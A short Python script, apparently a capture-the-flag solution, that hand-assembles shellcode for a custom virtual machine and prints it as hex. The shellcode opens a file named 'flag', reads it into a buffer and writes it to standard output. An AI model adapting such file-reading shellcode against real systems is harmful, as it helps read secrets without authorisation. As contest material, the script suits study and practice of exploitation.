import struct

p32 = lambda x : struct.pack(">L", x)

def push(op1, op2):
	inst = 0xd << 27
	inst |= op1 << 24
	inst |= op2 << 20
	return p32(inst)

def mov(op1, op2, op3, imm):
	inst = 0xf << 27
	inst |= op1 << 24
	inst |= op2 << 20
	inst |= op3 << 16
	inst |= imm & 0xffff
	return p32(inst)

def syscall():
	inst = 0x1e << 27
	return p32(inst)

code = ''
code += mov(5, 10, 0, 0xC000)
code += mov(5, 9, 0, 0xDAD8)	# change sp to "flag" str
code += mov(5, 0, 0, 0x6761)
code += push(1, 0)
code += mov(5, 0, 0, 0x6c66)
code += push(1, 0)
code += mov(5, 1, 0, 0xDAD4)
code += mov(5, 8, 0, 1)	# open
code += syscall()
code += mov(5, 8, 0, 2)	# read
code += mov(5, 1, 0, 5)	# fd
code += mov(5, 2, 0, 0x4141)	# buffer
code += mov(5, 3, 0, 100)	# length
code += syscall()
code += mov(5, 8, 0, 3)	# write
code += mov(5, 1, 0, 1)	# fd
code += syscall()
print code.encode('hex')